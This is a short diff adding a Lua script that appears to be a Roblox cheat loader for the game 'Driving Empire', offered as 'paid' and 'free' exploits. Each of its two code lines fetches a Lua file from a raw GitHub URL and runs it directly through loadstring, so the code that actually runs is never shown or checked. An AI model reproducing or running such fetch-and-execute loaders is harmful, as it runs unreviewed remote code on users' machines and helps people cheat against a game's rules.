@@ -1,0 +1,5 @@
+--Paid exploits:
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/awaprimPL/amazing/master/driving%20empire%20presents%20%5B1%5D.lua'),true))()
+--Just a note 
+--free ones: on some exploits paid link may work perfectly so i recomend trying
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/awaprimPL/amazing/master/driving%20empire%20presents%20%5B2%5D.lua'),true))()
